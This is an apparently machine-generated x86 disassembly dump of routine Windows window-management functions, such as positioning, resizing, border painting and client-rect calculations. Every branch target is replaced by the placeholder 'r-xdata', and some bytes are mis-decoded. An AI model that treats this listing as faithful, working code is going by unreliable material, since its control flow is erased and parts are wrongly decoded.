test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4507d8
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403450
sub_450974
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_41a62c
pop esi
pop ebx
retn
sub_450998
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_450974
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_41a4c0
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_41a64c
sub_450a0c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_450adc
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_44b16c
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_450a6c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_450ad0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450ad7
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403450
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_405a20
sub_450ae8
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44960c
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_450ba0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_41a5d0
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_41a474
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403450
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_450c00
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_450cf6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403450
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450cfd
mov eax [ ebp - 0x14 ]
call sub_403254
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_41a62c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_41a5d0
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403450
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_450d0c
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_450c00
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_450d38
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_461dc8
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_450c00
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_450c00
mov edx eax
mov eax esi
call sub_465b2c
sub_450d7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44d4d0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44d494
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_450dc4
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_450448
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44a228
sub_450e0c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_450e90
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_450adc
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_44d4d0
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_451252
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_44d4d0
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_450e0c
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_44d494
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_451269
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_450e90
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44b008
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4512a8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44be8c
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_449920
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_4512f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c0ac
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_451320
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_450adc
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_44d038
xor ecx ecx
push ebp
push sub_45144f
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_44d4d0
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_44d4d0
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451456
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_44d040
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44d494
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_451456
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403450
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403450
jmp r-xdata
sub_4514ec
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44b16c
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44b16c
sub_451530
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_44b16c
sub_4515a0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_451630
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_451896
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_423cc8
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_43a9dc
call sub_43aabc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4507d8
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_43a9dc
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_43b208
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
